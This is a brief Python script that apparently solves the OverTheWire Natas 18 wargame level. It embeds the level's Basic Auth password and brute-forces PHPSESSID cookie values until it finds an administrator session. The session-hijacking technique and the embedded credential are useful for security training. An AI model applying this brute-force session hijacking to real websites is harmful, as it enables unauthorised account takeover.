import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")
url = "http://natas18.natas.labs.overthewire.org/"

for i in range(0, 641):
    cookies = {"PHPSESSID": str(i)}
    r = requests.get(url, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print("SESSION:", i)
        print(r.text)
        break
